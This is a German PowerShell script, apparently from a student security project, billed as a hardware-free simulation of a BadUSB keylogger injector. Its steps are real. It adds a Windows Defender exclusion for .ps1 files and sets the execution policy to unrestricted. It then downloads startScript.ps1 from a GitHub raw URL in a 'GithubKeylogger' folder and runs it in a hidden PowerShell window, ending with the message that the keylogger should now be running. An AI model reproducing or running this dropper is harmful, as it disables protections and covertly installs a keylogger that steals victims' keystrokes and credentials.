# Simulation des BadUSB-Injektors ohne Hardware
# Dieses Skript führt die gleichen Schritte aus wie der BadUSB_keyloggerInjector.txt

Write-Host "Starte Simulation..."

# Gehe zu Public Documents
try {
    Set-Location "C:\Users\Public\Documents"
    Write-Host "Erfolgreich zu C:\Users\Public\Documents gewechselt."
} catch {
    Write-Host "Fehler beim Wechseln zu Public Documents: $_"
}

# Füge Ausnahme für .ps1-Dateien hinzu
try {
    Add-MpPreference -ExclusionExtension ps1 -Force
    Write-Host "Ausnahme für .ps1-Dateien hinzugefügt."
} catch {
    Write-Host "Fehler beim Hinzufügen der Ausnahme: $_"
}

# Deaktiviere Script-Blocker
try {
    Set-ExecutionPolicy unrestricted -Force
    Write-Host "ExecutionPolicy auf unrestricted gesetzt."
} catch {
    Write-Host "Fehler beim Setzen der ExecutionPolicy: $_"
}

# Lade startScript.ps1 herunter (ersetze LINK mit deinem URL)
$link = "https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/refs/heads/main/GithubKeylogger/startScript.ps1"
try {
    Invoke-WebRequest -Uri $link -OutFile "startScript.ps1"
    Write-Host "startScript.ps1 erfolgreich heruntergeladen."
} catch {
    Write-Host "Fehler beim Herunterladen von startScript.ps1: $_"
}

# Prüfe, ob startScript.ps1 existiert
if (Test-Path "startScript.ps1") {
    Write-Host "startScript.ps1 existiert."
} else {
    Write-Host "startScript.ps1 wurde nicht gefunden."
}

# Starte startScript.ps1 im Hintergrund
try {
    Start-Process powershell.exe -ArgumentList "-noexit -windowstyle hidden -file startScript.ps1" -NoNewWindow
    Write-Host "startScript.ps1 gestartet."
} catch {
    Write-Host "Fehler beim Starten von startScript.ps1: $_"
}

# Simuliere Capslock-Blinken (optional, nur zur Anzeige)
for ($i = 0; $i -lt 4; $i++) {
    $wshell = New-Object -ComObject wscript.shell
    $wshell.SendKeys("{CAPSLOCK}")
    Start-Sleep -Milliseconds 150
}
Start-Sleep -Seconds 2
for ($i = 0; $i -lt 4; $i++) {
    $wshell = New-Object -ComObject wscript.shell
    $wshell.SendKeys("{CAPSLOCK}")
    Start-Sleep -Milliseconds 150
}

Write-Host "Simulation abgeschlossen. Der Keylogger sollte jetzt laufen."
Read-Host "Drücke Enter zum Beenden"
